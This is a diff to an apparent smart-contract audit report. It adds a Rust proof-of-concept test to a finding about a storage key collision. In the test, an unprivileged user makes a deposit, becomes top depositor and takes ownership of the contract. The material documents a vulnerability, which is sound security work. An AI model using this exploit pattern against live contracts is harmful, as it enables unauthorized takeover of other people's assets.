@@ -229,9 +229,24 @@ something else. Also it is recommended to keep state variables
 in `state.rs` to more easily catch key collision.
 
 ### Proof of concept
+See `exploit_top_depositor_key_collision()` in integration tests.
 
 ```rust
-// code goes here
+// But another unprivileged user can still become the owner by becoming top depositor
+app = mint_tokens(app, UNPRIVILEGED_USER.to_string(), Uint128::from(111u128));
+app.execute_contract(
+    Addr::unchecked(UNPRIVILEGED_USER),
+    addr.clone(),
+    &ExecuteMsg::Deposit {},
+    &[coin(111u128, DENOM)],
+)
+.unwrap();
+let config: ConfigQueryResponse = app
+    .wrap()
+    .query_wasm_smart(addr.clone(), &QueryMsg::Config {})
+    .unwrap();
+assert_eq!(config.owner, Addr::unchecked(UNPRIVILEGED_USER));
+assert_eq!(config.threshold, Uint128::from(111u128));
 ```
 
 ---
